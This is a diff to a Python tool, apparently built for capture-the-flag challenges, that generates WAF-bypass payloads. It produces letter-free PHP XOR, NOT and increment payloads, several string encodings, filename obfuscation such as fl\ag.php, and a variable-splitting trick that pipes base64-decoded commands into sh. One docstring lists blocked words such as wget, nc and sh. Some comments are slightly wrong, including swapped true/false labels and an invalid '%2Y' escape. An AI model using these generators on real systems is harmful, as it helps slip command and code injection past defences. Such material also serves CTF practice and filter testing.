@@ -5,8 +5,9 @@ import urllib.parse
 
 def parse_waf_words(waf_words: str):
     """
-    解析 WAF 过滤词列表
-    Parse WAF forbidden words list
+    解析 WAF 过滤字符串
+    以 " | " 作为分割
+    Example: wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings
     """
     if not waf_words:
         return []
@@ -21,8 +22,8 @@ def parse_waf_words(waf_words: str):
 
 def parse_waf_chars(waf_chars: str):
     """
-    解析 WAF 过滤字符集
-    Parse WAF forbidden characters set
+    解析 WAF 过滤字符
+    Example: $#!@.
     """
     if not waf_chars:
         return set()
@@ -31,8 +32,9 @@ def parse_waf_chars(waf_chars: str):
 
 def parse_waf_regex(waf_regex: str):
     """
-    解析 WAF 正则表达式
-    Parse WAF regular expression
+    解析 WAF 正则表达
+    需要用 / ... / 进行包裹
+    Example: /[A-Za-z0-9_$]/
     """
     if not waf_regex:
         return None
@@ -51,8 +53,7 @@ def parse_waf_regex(waf_regex: str):
 
 def dedupe_preserve_order(items):
     """
-    保持顺序去重
-    Deduplicate list while preserving order
+    在保持顺序的前提下去重
     """
     seen = set()
     result = []
@@ -66,8 +67,7 @@ def dedupe_preserve_order(items):
 
 def is_payload_allowed(payload: str, waf_words, waf_chars, waf_regex, limit_length: int):
     """
-    检查 Payload 是否被 WAF 允许
-    Check if payload is allowed by WAF
+    检查 payload 是否可通过 WAF
     """
     if limit_length is not None and len(payload) > limit_length:
         return False
@@ -88,7 +88,6 @@ def is_payload_allowed(payload: str, waf_words, waf_chars, waf_regex, limit_leng
 def url_encode(payload: str):
     """
     URL 编码
-    URL encoding
     """
     return urllib.parse.quote(payload, safe="")
 
@@ -96,7 +95,6 @@ def url_encode(payload: str):
 def double_url_encode(payload: str):
     """
     双重 URL 编码
-    Double URL encoding
     """
     return urllib.parse.quote(url_encode(payload), safe="")
 
@@ -104,7 +102,6 @@ def double_url_encode(payload: str):
 def unicode_escape_encode(payload: str):
     """
     Unicode 转义编码
-    Unicode escape encoding
     """
     return "".join("\\u%04x" % ord(ch) for ch in payload)
 
@@ -112,7 +109,6 @@ def unicode_escape_encode(payload: str):
 def hex_escape_encode(payload: str):
     """
     十六进制转义编码
-    Hex escape encoding
     """
     return "".join("\\x%02x" % ord(ch) for ch in payload)
 
@@ -120,7 +116,6 @@ def hex_escape_encode(payload: str):
 def octal_escape_encode(payload: str):
     """
     八进制转义编码
-    Octal escape encoding
     """
     return "".join("\\%03o" % ord(ch) for ch in payload)
 
@@ -128,7 +123,6 @@ def octal_escape_encode(payload: str):
 def base64_encode(payload: str):
     """
     Base64 编码
-    Base64 encoding
     """
     data = payload.encode("utf-8")
     return base64.b64encode(data).decode("ascii")
@@ -136,16 +130,14 @@ def base64_encode(payload: str):
 
 def generate_php_xor(text: str):
     """
-    生成 PHP 异或 Payload (无字母数字)
-    Generate PHP XOR Payload (No Alphanumeric)
-    Format: ('%xx'^'%xx')...
+    PHP 异或
+    Example: ('%xx'^'%xx')...
     """
     xor_str1 = ""
     xor_str2 = ""
     for char in text:
         found = False
-        # 寻找两个非字母数字字符，使得它们异或的结果等于 char
-        # Find two non-alphanumeric chars that XOR to char
+        # 寻找两个非字母数字字符，使其异或结果等于目标字符
         for i in range(256):
             if found:
                 break
@@ -161,16 +153,17 @@ def generate_php_xor(text: str):
                     xor_str2 += "%" + hex(j)[2:].zfill(2)
                     found = True
                     break
+
     if len(xor_str1) // 3 != len(text):
-        return None  # Failed to find combination
+        return None 
+    
     return f"('{xor_str1}'^'{xor_str2}')"
 
 
 def generate_php_not(text: str):
     """
-    生成 PHP 取反 Payload
-    Generate PHP Bitwise NOT Payload
-    Format: ~%xx%xx...
+    PHP 按位取反
+    Example: ~%xx%xx...
     """
     not_str = ""
     for char in text:
@@ -185,77 +178,108 @@ def generate_php_not(text: str):
 
 def generate_php_increment(text: str):
     """
-    生成 PHP 自增 Payload
-    Generate PHP Increment Payload (No Alphanumeric)
+    PHP 自增
     """
 
-    payload = "$_=[].'';"  # $_ = "Array"
-    variables = {} # char -> variable name
-    
-    code_parts = []
-    code_parts.append("$_=[].''") # "Array"
-    
-    if not text.isalpha():
-        return None # 目前仅支持纯字母的命令，如 system, ls, cat 等
-        
-    # 定义 0 和 3 的无数字表示
-    # 0: []!=[] (False)
-    # 1: []==[] (True)
-    # 3: (1+1+1)
-    
-    zero = "([]!=[])"
-    one = "([]==[])"
-    three = f"({one}+{one}+{one})"
-    
-    # 初始化代码
-    # $a = "Array"
-    # $b = 'A'
-    # $c = 'a'
-    init = "$_=[].'';$b=$_[%s];$c=$_[%s];" % (zero, three)
-    
-    # 构建目标字符串
+    payload = "$_=[].'';"   # $_ 先得到数组字符串
+    variables = {}          # 字符到变量名映射
 
+    code_parts = []
+    code_parts.append("$_=[].''")  # 数组字符串
+
+    if not text.isalpha():
+        return None  # 仅支持纯字母命令
+
+    zero = "([]!=[])"   # true
+    one = "([]==[])"    # false
+    three = f"({one}+{one}+{one})"
+
+    # 初始化关键字符
+    # 取出大写起始字符
+    # 取出小写起始字符
+    init = "$_=[].'';$b=$_[%s];$c=$_[%s];" % (zero, three)
+
+    # 构建目标字符串
     res_var = "$_____"
     iter_var = "$____"
-    
+
     parts = [
-        "$_=[].''",     
-        "$__=$_[[]!=[]]", 
-        "$___=$_[[]==[]+[]==[]+[]==[]]", 
-        f"{res_var}=_"
+        "$_=[].''",
+        "$__=$_[[]!=[]]",
+        "$___=$_[[]==[]+[]==[]+[]==[]]",
+        f"{res_var}=_",
     ]
-    
-    parts.pop() 
-    parts.append(f"{res_var}=''") # $_____ = ""
-    
+
+    parts.pop()
+    parts.append(f"{res_var}=''")  # $_____ = ""
+
     for char in text:
-        if 'A' <= char <= 'Z':
-            base = 'A'
+        if "A" <= char <= "Z":
+            base = "A"
             base_var = "$__"
         else:
-            base = 'a'
+            base = "a"
             base_var = "$___"
-            
+
         diff = ord(char) - ord(base)
-        
-        # $iter = $base;
+
+        # 设置迭代变量
         parts.append(f"{iter_var}={base_var}")
-        
-        # ++$iter diff times
+
         if diff > 0:
-            parts.append(f"{iter_var}++"*diff)
-            
-        # $res .= $iter
+            parts.append(f"{iter_var}++" * diff)
+
         parts.append(f"{res_var}.={iter_var}")
-    
+
     return ";".join(parts)
+
+
+def obfuscate_filename_escape(path: str):
+    """
+    插入转义符 "\\"
+    Example: flag.php -> fl\ag.php
+    """
+    if not path or len(path) < 2:
+        return path
+
+    parts = list(path)
+
+    # 随机插入
+    if len(parts) > 3:
+        import random
+
+        idx = random.randint(1, len(parts) - 1)
+        if parts[idx].isalnum():
+            parts.insert(idx, "\\")
+
+    return "".join(parts)
+
+
+def obfuscate_filename_quotes(path: str):
+    """
+    插入空引号 ''
+    Example: flag.php -> fl''ag.php
+    """
+    if not path or len(path) < 2:
+        return path
+
+    parts = list(path)
+    if len(parts) > 3:
+        import random
+
+        idx = random.randint(1, len(parts) - 1)
+        if parts[idx].isalnum():
+            parts.insert(idx, "''")
+
+    return "".join(parts)
 
 
 def _split_string_to_vars(text: str):
     """
     随机拆分字符串并分配给随机变量
-    Randomly split string and assign to random variables
-    Returns: (assignment_str, concatenation_str)
+    主要和变量拆分绕过适配
+    Example: b=bas;c=e64;a=s;c=h;echo%2Y2F0IGZsYWcudHh0|$b$c%20-d|$a$c
+    return: (assignment_str, concatenation_str)
     """
     import random
     import string
@@ -263,46 +287,44 @@ def _split_string_to_vars(text: str):
     if not text:
         return "", ""
 
-    # Generate random split points
+    # 生成随机切分点
     length = len(text)
     if length == 1:
         splits = [text]
     else:
-        # Split into 2-4 parts randomly
+        # 随机切成 2 到 4 段
         num_parts = random.randint(2, min(length, 4))
-        # Create random split indices
+        # 生成随机切分索引
         indices = sorted(random.sample(range(1, length), num_parts - 1))
         indices = [0] + indices + [length]
-        
+
         splits = []
         for i in range(len(indices) - 1):
-            splits.append(text[indices[i]:indices[i+1]])
+            splits.append(text[indices[i] : indices[i + 1]])
 
-    # Assign to random variables
+    # 分配到随机变量
     assignments = []
     vars_used = []
-    
+
     available_chars = string.ascii_lowercase
-    
+
     for part in splits:
         var_name = random.choice(available_chars)
         while var_name in vars_used:
             var_name = random.choice(available_chars) + random.choice(available_chars)
-        
+
         vars_used.append(var_name)
         assignments.append(f"{var_name}={part}")
-    
+
     concat_str = "".join([f"${v}" for v in vars_used])
     assign_str = ";".join(assignments) + ";"
-    
+
     return assign_str, concat_str
 
 
 def get_encoding_strategies():
     """
     获取所有编码策略
-    Get all encoding strategies
-    Note: Some strategies return raw encoded strings, others return execution wrappers.
     """
     return [
         ("url", url_encode),
@@ -316,8 +338,7 @@ def get_encoding_strategies():
 
 def _strip_regex_delimiters(token: str):
     """
-    剥离正则表达式定界符
-    Strip regex delimiters
+    剥离正则表达式分隔符
     """
     token = token.strip()
     if token.startswith("/") and token.endswith("/"):
@@ -335,8 +356,7 @@ def _strip_regex_delimiters(token: str):
 
 def _parse_regex_flags(flag_str: str):
     """
-    解析正则表达式标志
-    Parse regex flags
+    解析正则
     """
     flags = 0
     for ch in flag_str:
